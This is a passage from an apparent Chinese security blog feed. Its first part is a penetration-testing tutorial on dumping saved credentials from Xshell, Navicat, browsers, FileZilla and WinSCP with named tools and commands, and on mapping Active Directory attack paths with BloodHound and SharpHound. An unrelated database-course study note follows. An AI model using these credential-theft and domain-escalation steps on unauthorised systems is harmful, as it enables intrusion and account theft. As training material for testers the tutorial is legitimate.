%USERPROFILE%\Documents\NetSarang\Xshell\Sessions</span><br><span class="line">Xshell 6 - %USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Sessions</span><br><span class="line">Xshell 7 - %USERPROFILE%\Documents\NetSarang Computer\7\Xshell\Sessions</span><br></pre></td></tr></table></figure><p>Xshell全版本凭证一键恢复工具SharpXDecrypt<br>项目地址:<a href="https://github.com/JDArmy/SharpXDecrypt">https://github.com/JDArmy/SharpXDecrypt</a><br>直接运行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug&gt; .\SharpXDecrypt.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051447437.png" alt="image.png"></p><p>Xshell 7 以前的版本,测试人员可以通过 SharpDecryptPwd工具进行解密,包括Navicat、TeamViewer、FileZilla、WinSCP和Xmangeger系列产品。<br>项目地址:<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a><br>将SharpDecryptPwd上传到目标主机,执行以下命令,可以直接获取Xshell保存的所有连接凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -Xmangager -p &quot;[对应版本Xshell.xsh文件地址]&quot;</span><br></pre></td></tr></table></figure><p>Xshell 7 后的版本, Session目录中不再存储用户密码,用上述方法获取的密码为一串乱码,使用星号密码查看器直接查看密码。<br>工具下载链接:<a href="https://www.lanzoui.com/i2tcmej">https://www.lanzoui.com/i2tcmej</a><br>打开xshell7,选择用户登录界面,把密码查看器的放大镜对焦到星型密码框,即可看到用户密码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051433621.png" alt="image.png"></p><h4 id="3-获取NaviCat保存的凭据"><a href="#3-获取NaviCat保存的凭据" class="headerlink" title="3.获取NaviCat保存的凭据"></a>3.获取NaviCat保存的凭据</h4><p>用户默认选择保存密码，Navicat将登录信息保存到注册表中，且经过可逆算法加密，且Navicat&lt;&#x3D;11版本和Navicat&gt;&#x3D;12<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1682414743545-3a3152c6-36fa-48cd-9c5c-dd3a0620010b.png#averageHue=%23e7e7e6&clientId=u1e4135fb-5e1c-4&from=paste&height=173&id=ua515f842&originHeight=345&originWidth=1214&originalType=binary&ratio=2&rotation=0&showTitle=false&size=347190&status=done&style=none&taskId=u45523623-ae1e-4374-adb6-bbb48cabf4b&title=&width=607" alt="image.png"></p><p>使用SharpDecryptPwd可以一键导出当前著加上用户连接过的所有数据库的登录凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -NavicatCrypto</span><br></pre></td></tr></table></figure><p>Navicat连接数据库,保存凭证<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051550250.png" alt="image.png"></p><p>成功连接后运行SharpDecryptPwd.exe<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051601525.png" alt="image.png"><br>成功获取用户账号密码</p><h4 id="4-获取浏览器保存的登录凭据"><a href="#4-获取浏览器保存的登录凭据" class="headerlink" title="4.获取浏览器保存的登录凭据"></a>4.获取浏览器保存的登录凭据</h4><p>HackBrowserData是一款开源工具，可以直接从浏览器解密数据包包括用户登录密码、书签、cookie、历史记录、信用卡、下载链接、历史记录等csv文件<br>将HackBrowserData上传到目标主机直接运行即可。<br>项目地址:<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>直接运行<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051647715.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:Users\&gt;hack-browser-data-windows-64bit.exe</span><br></pre></td></tr></table></figure><p>查看导出的csv<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051650833.png" alt="image.png"><br>成功导出用户密码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051653119.png" alt="image.png"></p><h4 id="5-获取FileZilla保存的凭据"><a href="#5-获取FileZilla保存的凭据" class="headerlink" title="5.获取FileZilla保存的凭据"></a>5.获取FileZilla保存的凭据</h4><p>FileZilla是一款快速的、可依赖的、开源的FTP客户端软件,具备大多数FTP软件功能.FileZilla会将所有FTP登录凭据以Base64密文格式保存在%USERPROFILE%\AppDate\Roaming\FileZilla\recentservers.xml文件中。&lt;User&gt;节点记录了FTP登录用户,&lt;Pass&gt;节点记录了Base64加密后的用户密码,将加密的FTP密码解密即可。<br>使用SharpDecryptPwd 一键导出FileZilla保存的FTP登录凭据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -FileZilla</span><br></pre></td></tr></table></figure><h4 id="6-获取WinSCP保留的登录凭据"><a href="#6-获取WinSCP保留的登录凭据" class="headerlink" title="6.获取WinSCP保留的登录凭据"></a>6.获取WinSCP保留的登录凭据</h4><p>WinSCP是Windows环境下使用SSH的开源图形化SFTP工具客户端.在使用SFTP连接时,如果勾选了”保存密码”,WinSCp就会将密码保存在WinSCP.ini文件下。Winscppwd工具则可以进行解密.<br>工具下载地址:<a href="https://www.softpedia.com/get/Security/Password-Managers-Generators/winscppwd.shtml">https://www.softpedia.com/get/Security/Password-Managers-Generators/winscppwd.shtml</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Winscppwd.exe WinSCP.ini reading WinSCP.ini</span><br></pre></td></tr></table></figure><h3 id="5-使用BloodHound自动化分析域环境"><a href="#5-使用BloodHound自动化分析域环境" class="headerlink" title="5.使用BloodHound自动化分析域环境"></a>5.使用BloodHound自动化分析域环境</h3><p>项目地址:<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p><p>  BloodHound是一款强大的域内环境分析工具，可以揭示并分析域环境中各对象之间<br>的关系，将域内相关用户、用户组、计算机等对象之间的关系以可视化方式呈现。通过BloodHound,测试人员可以更直观、更便捷地分析域内环境的整体情况，并快速识别出<br>复杂的攻击路径。</p><p>BloodHound基于Neo4j数据库（一种NoSQL图数据库，可将结构化数据存储在网络上)。在使用时，测试人员需提前将域环境中采集到的数据导入BloodHound的Neo4j数据库，然后通过BloodHound对这些数据进行分析，以可视化方式呈现。</p><h4 id="1-BloodHound环境部署"><a href="#1-BloodHound环境部署" class="headerlink" title="1.BloodHound环境部署"></a>1.BloodHound环境部署</h4><p>参考文章:<a href="https://blog.csdn.net/qq_56426046/article/details/126854991">https://blog.csdn.net/qq_56426046&#x2F;article&#x2F;details&#x2F;126854991</a><br>1.安装Neo4j数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install neo4j</span><br></pre></td></tr></table></figure><p>安装好后运行图形化数据库Neo4j</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">neo4j start</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051813934.png" alt="image.png"></p><p>访问<a href="http://localhost:7474/">http://localhost:7474</a><br>默认账号密码都是:neo4j<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051816299.png" alt="image.png"></p><p>首次登录会提示修改密码，修改完成后跳转至如下页面，表示Neo4j安装成功<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051818723.png" alt="image.png"></p><p>去官网下载BloodHound-linux-x64<br><a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1">https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1</a><br>解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip BloodHound-linux-x64</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd BloodHound-linux-x64</span><br><span class="line">./BloodHound --no-sandbox</span><br></pre></td></tr></table></figure><p>登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username:neo4j</span><br><span class="line">Password:123456</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051856397.png" alt="image.png"></p><p>启动成功页面:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051858185.png" alt="image.png"></p><h4 id="2-BloodHound使用"><a href="#2-BloodHound使用" class="headerlink" title="2.BloodHound使用"></a>2.BloodHound使用</h4><p>BloodHound需要来自Active Directory（AD）环境的三条信息才能运行：</p><ul><li>哪些用户登录了哪些机器</li><li>哪些用户拥有管理员权限</li><li>哪些用户和组属于哪些组<br>在大多数情况下，收集此信息不需要管理员权限，也不需要在远程系统上执行代码。</li></ul><h5 id="1-采集并导出数据"><a href="#1-采集并导出数据" class="headerlink" title="1.采集并导出数据"></a>1.采集并导出数据</h5><p>使用官方数据采集器SharpHound，有可执行文件和Powershell两个版本。<br>项目地址:<a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a><br>SharpHound 会自动采集域内的用户、用户组、计算机、组策略、域信任关系等信息，将采集到的所有信息在当前目录下打包成一个以时间戳标识的ZIP文件。SharpHound.exe对.netframwork版本有需求,需安装对应版本。</p><p>SharpHound与BloodHound也需要版本匹配!</p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c All</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052132117.png" alt="image.png"></p><p>文件夹下生成zip文件<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052133120.png" alt="image.png"></p><h5 id="2-导入数据"><a href="#2-导入数据" class="headerlink" title="2.导入数据"></a>2.导入数据</h5><p>将采集到的.zip文件保存至本地,单击右侧的Upload Data按钮自动将生成的ZIP数据包导入<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052136599.png" alt="image.png"></p><p>导入后BloodHound进行自动化数据分析。分析结束后,左侧的Database Info 模块处就有数据了<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052223689.png" alt="image.png"></p><p>可以在Analysis进行不同的分析查询,例如Shortest Paths to Domain Admins<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052226252.png" alt="image.png"></p><h5 id="3-节点信息"><a href="#3-节点信息" class="headerlink" title="3.节点信息"></a>3.节点信息</h5><p>BloodHound通过图形和连线来呈现数据，每个图形被称为一个节点，用来表示域内不同的对象。域内不同的对象，如用户、用户组、计算机、域、组策略、组织单位等，都用专属的图形来表示。</p><p>点击任一节点，左侧的Node Info会显示关于该节点的信息，包括节点概述、节点属性、所属组、所拥有的权限。不同的对象包含不同类型的节点信息。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052231307.png" alt="image.png"></p><h5 id="4-边缘信息"><a href="#4-边缘信息" class="headerlink" title="4.边缘信息"></a>4.边缘信息</h5><p>边缘时连接两个相互作用的节点之间的连线，可以反应两个相互作用的节点之间的联系<br>如图所示:右侧红线所指的两个组为DOMAIN ADMINS和ENTERPRISE ADMINS<br>用户ADMINISTRATOR是这两组的成员。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052234885.png" alt="image.png"></p><p>常见边缘类型:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052236789.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052237119.png" alt="image.png"><br>更多细节可查询官方文档。</p><h5 id="5-数据分析"><a href="#5-数据分析" class="headerlink" title="5.数据分析"></a>5.数据分析</h5><p>BloodHound在Analysis模块中预设了很多查询功能，常用的查询功能及说明见下表<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052239924.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052239670.png" alt="image.png"></p><h6 id="1-查找所有的域管理员"><a href="#1-查找所有的域管理员" class="headerlink" title="1.查找所有的域管理员"></a>1.查找所有的域管理员</h6><p>Analysis模块中的”Find all Domain Admins”,查找所有域管理员。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052240790.png" alt="image.png"><br>当前环境有1个域管理员用户，是Domain Admins组的成员</p><h6 id="2-识别达到域管理员的最短路径"><a href="#2-识别达到域管理员的最短路径" class="headerlink" title="2.识别达到域管理员的最短路径"></a>2.识别达到域管理员的最短路径</h6><p>Analysis模块中的”Find Shortest Paths to Domain Admins”,识别出到达域管理员的最短路径<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052247316.png" alt="image.png"></p><p>可以根据不同节点间的不同边缘判定攻击方式，从而实现盗取凭据等功能。</p><h6 id="3-查找所有拥有DCSync权限的主体"><a href="#3-查找所有拥有DCSync权限的主体" class="headerlink" title="3.查找所有拥有DCSync权限的主体"></a>3.查找所有拥有DCSync权限的主体</h6><p>Analysis模块中的”Find Principals with DCSync Rights”<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052256187.png" alt="image.png"><br>拥有DCSync权限的主体可以通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求，并从域控制器请求数据。通过DCSync,测试人员可以导出所有域用户的哈希值，实现隐蔽的权限维持，将在后面讲解。</p><h6 id="4-映射域信任关系"><a href="#4-映射域信任关系" class="headerlink" title="4.映射域信任关系"></a>4.映射域信任关系</h6><p>Analysis模块中的”Map Domain Trusts”,显示当前域信任关系。域信任解决了多域环境中的跨域资源共享问题，允许受信任域的用户访问信任域中的资源。域是一个具有安全边界的计算机集合，两个域之间必须具有域信任关系，才能相互访问到对方域的资源。测试人员通过尝试收集有关域信任关系的信息，可以为Windows多域&#x2F;域林环境中的横向移动寻找机会。</p><h6 id="5-识别到达无约束委派系统的最短路径"><a href="#5-识别到达无约束委派系统的最短路径" class="headerlink" title="5.识别到达无约束委派系统的最短路径"></a>5.识别到达无约束委派系统的最短路径</h6><p>“Analysis”模块中的“Shortest Paths to Unconstrained Delegation Systems”,识别出到达无约束委派系统的最短路径。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052305283.png" alt="image.png"><br>域委派是指将域内用户的权限委派给服务账户，使得服务账户能够以该用户的身份在域内开展其他活动，如访问域内的其他服务。委派为域内的多跳认证带来很大的便利，也带来很大的安全隐患。通过滥用委派，管理人员可以获取域管理员权限，接管整个域环境，也可以用来制作后门，实现隐蔽的权限维持。</p><h6 id="6-列出所有Kerberoastable用户"><a href="#6-列出所有Kerberoastable用户" class="headerlink" title="6.列出所有Kerberoastable用户"></a>6.列出所有Kerberoastable用户</h6><p>Analysis模块中的”List all Kerberoastable Accounts”，列出所有Kerberoastable用户。</p><h6 id="7-识别达到Kerberoastable用户的最短路径"><a href="#7-识别达到Kerberoastable用户的最短路径" class="headerlink" title="7.识别达到Kerberoastable用户的最短路径"></a>7.识别达到Kerberoastable用户的最短路径</h6><p>Analysis模块中的”Shortest Paths from Kerberoastable Users”,识别出到达Kerberoastable用户的最短路径</p><h6 id="8-识别到达高价值目标的最短路径"><a href="#8-识别到达高价值目标的最短路径" class="headerlink" title="8.识别到达高价值目标的最短路径"></a>8.识别到达高价值目标的最短路径</h6><p>Analysis模块中的”Shortest Paths to High Value Targets” , 识别出到达高价值目标的最短路径。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052314509.png" alt="image.png"></p><h6 id="9-查找所有非域控制器的域管理登录"><a href="#9-查找所有非域控制器的域管理登录" class="headerlink" title="9.查找所有非域控制器的域管理登录"></a>9.查找所有非域控制器的域管理登录</h6><p>Analysis模块中的”Find Domain Admin Logons to non-Domain Controllers”,可以找出域管理员在所有非域控的主机的登录痕迹,为准确获取域管理员提供了方向。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309052318582.png" alt="image.png"><br>域管理员曾在WIN7.HACK-MY.COM主机上登陆过，测试人员可以通过入侵这两台主机，可以找到域管理员活动的进程，通过迁移进程或令牌窃取等手段，便可获取域管理权限。</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库基础</title>
      <link href="/2023/09/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库系统原理-期末速成"><a href="#数据库系统原理-期末速成" class="headerlink" title="数据库系统原理-期末速成"></a>数据库系统原理-期末速成</h1><p>应对期末考试,快速过一遍数据库系统原理</p><h2 id="1-数据库概览"><a href="#1-数据库概览" class="headerlink" title="1. 数据库概览"></a>1. 数据库概览</h2><h3 id="1-1数据库管理技术的发展"><a href="#1-1数据库管理技术的发展" class="headerlink" title="1.1数据库管理技术的发展"></a>1.1数据库管理技术的发展</h3><p>1.数据的含义称为数据的语义。例：93是一个数字，语义1：学生某课成绩。语义2：某人的体重。<br>2.数据管理时数据处理的核心。</p><h3 id="1-2理解数据库系统"><a href="#1-2理解数据库系统" class="headerlink" title="1.2理解数据库系统"></a>1.2理解数据库系统</h3><p>3.数据库(DB)是长期储存在计算机内、有组织的、可共享的大量数据集合。<br>4.数据库管理系统(DBMS) 是位于用户与操作系统之间的一层数据管理软件。例如Mysql,Mssql,Oracle等。<br>5.数据库系统(DBS) 是指带有数据库并利用数据库技术进行数据管理的计算机系统。</p><h3 id="1-3数据库系统体系结构"><a href="#1-3数据库系统体系结构" class="headerlink" title="1.3数据库系统体系结构"></a>1.3数据库系统体系结构</h3><p>1.三级模式: 外模式、模式、内模式<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011928833.png" style="zoom:50%;" /></p><blockquote><p>a.模式: </p><p>1.数据库中全体数据的逻辑结构和特征的描述。</p><p>2.一个数据库只有一个模式。</p></blockquote><blockquote><p>b.外模式:</p><p>1.是模式子集。外模式面向具体应用,是数据库用户所能使用的局部数据的逻辑结构和特征的描述。</p><p>2.一个数据库可以有多个外模式</p></blockquote><blockquote><p>c.内模式(存储模式)</p><p>1.是数据库的物理结构。</p><p>2.一个数据库只有一个内模式。</p></blockquote><p>2.数据库系统的二级映像:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011932692.png" style="zoom: 50%;" /><blockquote><p>外模式&#x2F;模式映像:</p><p>1.定义了外模式与模式的对应关系。</p><p>2.外模式&#x2F;模式映像保证了数据的逻辑独立性。</p></blockquote><blockquote><p>模式&#x2F;内模式映像:</p><p>1.定义了数据库全局逻辑结构与存储结构之间的对应关系。</p><p>2.模式&#x2F;内模式映像保证了数据库的物理独立性。</p></blockquote><h3 id="1-4数据模型"><a href="#1-4数据模型" class="headerlink" title="1.4数据模型"></a>1.4数据模型</h3><p>1.模型是现实世界特征的模拟与抽象。<br>2.数据模型的层次: 概念数据模型-&gt;逻辑数据模型-&gt;物理数据模型<br>3.两步抽象: 1.现实世界中的客观对象抽象为概念模型 2.把概念模型转换为某一DBMS支持的数据模型。</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011936122.png" style="zoom:50%;" /><p>概念模型的表示方法(重点!)<br>实体-联系方法(E-R方法)<br>1.E-R三要素: 实体、属性、联系<br>2.E-R图</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011939252.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011940748.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011940807.png" style="zoom:50%;" /><p>几种联系的画法参考书或课件!</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011941939.png" style="zoom:50%;" /><p>E-R图例题:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942233.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942584.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011942160.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011943869.png" style="zoom:50%;" /><p>逻辑数据模型三要素: 1.数据结构 2.数据操作 3.数据的约束条件<br>逻辑数据模型的类别: 1.格式化模型 2.关系模型 3.面向对象模型 4.对象关系模型</p><h2 id="2-关系数据模型"><a href="#2-关系数据模型" class="headerlink" title="2.关系数据模型"></a>2.关系数据模型</h2><h3 id="2-1关系数据结构"><a href="#2-1关系数据结构" class="headerlink" title="2.1关系数据结构"></a>2.1关系数据结构</h3><p>1.一个关系就是一个规范化的二维表。规范化是指表中每列都是原子项,即没有表中表。<br>一个关系由关系名(表名)、关系模式(表头)和关系实例(数据)组成。<br>2.二维表基本术语:</p><ol><li>关系: 二维表</li><li>元祖: 二维表中的一行即为一个元祖</li><li>属性: 二维表中的一列即为一个属性</li><li>码: 表中可唯一确定元祖的单个属性或属性组</li><li>域: 属性的取值范围</li><li>分量: 元组中的一个属性值</li><li>关系模式: 对关系”型”描述 。通常表示为: 关系名(属性1,属性2,…,属性n)</li></ol><p>3.笛卡尔积</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011956925.png" style="zoom:50%;" /><p>例如:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309011959326.png" style="zoom:50%;" /><p>元祖: 笛卡尔积中每一个元素交n元祖或元祖<br>分量: 笛卡尔积元祖(d1,d2,…,dn) 中的每一个值di 叫做一个分量<br>基数: 每个域中元素的数量的乘积。如上例中，即为2x2x3<br>笛卡尔积表示方法:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012003776.png" style="zoom: 50%;" /><p>4.关系:</p><ol><li><p>D1xD2x…xDn的子集成为在域D1,D2,…,Dn上的关系,表示为 R (D1,D2,…,Dn)。R为关系名, n:关系的目或度。</p></li><li><p>关系中的每个元素是关系中的元祖,通常用t表示。<br>5.关系模式</p><ol><li>定义通常简记为R(U) 或R(A1,A2,…,An)</li><li>关系模式是型, 关系式值</li></ol></li></ol><p>6.关系数据库:</p><pre><code>1. 在一个给定的应用领域中,所有实体及实体之间联系的关系的集合构成一个关系数据库。1. 关系数据库的型称为关系数据库模式。关系数据库的值称为关系数据库。1. 关系元祖中允许出现空值。空置代表未知的值或不存在的值。一般用关键词NULL表示。</code></pre><p>7.码<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012018972.png" style="zoom:50%;" /></p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012023942.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012023027.png" style="zoom:50%;" /><p>具体内容参照教材或课程ppt!</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012017070.png" style="zoom:50%;" /><h3 id="2-2关系操作"><a href="#2-2关系操作" class="headerlink" title="2.2关系操作"></a>2.2关系操作</h3><p>1.关系代数: 将关系看成元祖的集合,运算从关系的”水平”方向即行的角度来进行<br>2.表示记号</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012044374.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012045249.png" style="zoom:50%;" /><p>3.关系操作实例:<br>并, 提取出R和S各自的元祖,去重后组合在一起</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012045918.png" style="zoom:50%;" /><p>差  R-S&#x3D;R减去R和S共有的部分<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012047817.png" style="zoom:50%;" /></p><p>交 R和S共有的部分<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012047723.png" style="zoom:50%;" /></p><p>笛卡尔积<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012049034.png" style="zoom:50%;" /></p><p>4.专门的运算符!</p><p>​1.选择: 从行的角度进行运算:<br>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012051934.png" style="zoom:50%;" /></p><p>​2.投影: 从列的角度进行运算:<br>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012052241.png" style="zoom:50%;" /></p><p>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012053932.png" style="zoom:50%;" /></p><p>​3.连接: 从R和S的广义笛卡尔积RXS中选取满足给定关系的元祖<br>​1.一般连接<br>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012054264.png" style="zoom:50%;" /></p><p>​2.等值连接:<br>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012055490.png" style="zoom:50%;" /></p><p>​3.自然连接: 和前两者相比,需要取消重复列<br>​<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012057007.png" style="zoom:50%;" /></p><p>​4.外连接: 左外连接,又外连接,外连接<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012058088.png" style="zoom:50%;" /></p><p>​左外连接以左边R为主,结果中包含左表中全部的行,以及右表中所有匹配的行。右外连接相反。<br>​全外连接：自然连接中把舍弃的元祖都保存在结果中，而在其他属性上填空值(NULL)</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012100012.png" style="zoom:50%;" /><p>​5.除<br>​像极:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012103740.png" style="zoom:50%;" /><br>​除法:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012104072.png" style="zoom:50%;" /></p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012105660.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012105920.png" style="zoom:50%;" /><h2 id="3-关系数据库语言SQL"><a href="#3-关系数据库语言SQL" class="headerlink" title="3.关系数据库语言SQL"></a>3.关系数据库语言SQL</h2><h3 id="3-1-SQL概述"><a href="#3-1-SQL概述" class="headerlink" title="3.1 SQL概述"></a>3.1 SQL概述</h3><p>1.SQL结构化查询语言是关系数据库的标准语言。<br>2.SQL特点: 综合统一、高度非过程化、面向集合的操作方式、以同一种语法结构提供两种使用方法、语言简洁易学易用。<br>3.基本表：独立存在于数据库中的表，是“实表”<br>4.视图是从一个或几个基本表导出的表，是“虚表”。它本身不存在与数据库中，数据库中只存放视图的定义，而不存放视图对应的数据，这些数据仍存放在导出视图的基本表中。当基本表中数据变化时，视图中查询出来的数据也随之改变。<br>5.数据库是逻辑的，存储文件时物理的。数据库的所有信息都保存在存储文件中。<br>6.索引：索引是根据索引表达式的值进行逻辑排序的一组指针，可以实现对数据的快速访问。是关系数据库的内部实现技术，属于内模式，被存放在存储文件中。</p><h3 id="3-2-SQL语言的数据类型"><a href="#3-2-SQL语言的数据类型" class="headerlink" title="3.2 SQL语言的数据类型"></a>3.2 SQL语言的数据类型</h3><p>1.数值型：包括整形(bigint、int、smallint、tinyint、bit)、定点实数(numeric、decimal)、浮点数(float、real)。<br>2.字符型: 包括定长字符串char和变长字符串varchar。<br>3.Unicode字符型: 包括nchar[(n)]和nvarchar[(n)]两类。<br>4.文本型: 包括text和ntext两类。<br>5.日期时间类型: 包括datetime和smalldatetime两类。用户以字符串形式输入日期时间类型数据，系统也以字符串形式输出日期时间类型数据。<br>例如: 2009-10-10 7:18:18 PM &#x2F;*12小时格式*&#x2F;<br>2009-10-10 19:18:18 &#x2F;*24小时格式*&#x2F;<br>6.二进制数据类型表示为位数据流。</p><h3 id="3-3-数据定义"><a href="#3-3-数据定义" class="headerlink" title="3.3 数据定义"></a>3.3 数据定义</h3><p>在学习前，先把环境搭一下。<br>参考文章<a href="https://blog.csdn.net/weixin_46081857/article/details/128127425">https://blog.csdn.net/weixin_46081857&#x2F;article&#x2F;details&#x2F;128127425</a></p><h4 id="3-3-1-模式定义"><a href="#3-3-1-模式定义" class="headerlink" title="3.3.1 模式定义"></a>3.3.1 模式定义</h4><p>1.定义数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>2.使用数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">USE <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>3.修改数据库</p><p>该语句可以对指定的数据库的数据文件和日志文件等进行修改</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> DATABASE <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>4.删除数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-3-2基本表定义"><a href="#3-3-2基本表定义" class="headerlink" title="3.3.2基本表定义"></a>3.3.2基本表定义</h4><p>1.定义基本表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span 